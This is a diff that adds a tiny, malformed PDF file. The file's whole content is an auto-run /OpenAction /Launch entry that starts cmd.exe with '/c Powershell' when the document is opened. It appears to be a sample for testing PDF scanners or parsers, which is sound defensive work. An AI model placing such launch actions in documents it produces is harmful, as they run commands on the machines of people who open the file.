@@ -1,0 +1,12 @@
+%PDF-1.
+trailer<</Root<</Pages<</Kids[<</MediaBox[0 0 3 3]>>>>
+<<
+/OpenAction <<
+/S /Launch /Win
+<<
+/F (C:\\Windows\\system32\\cmd.exe) /P (/c Powershell))
+>>
+>>
+>>
+>>
+>>
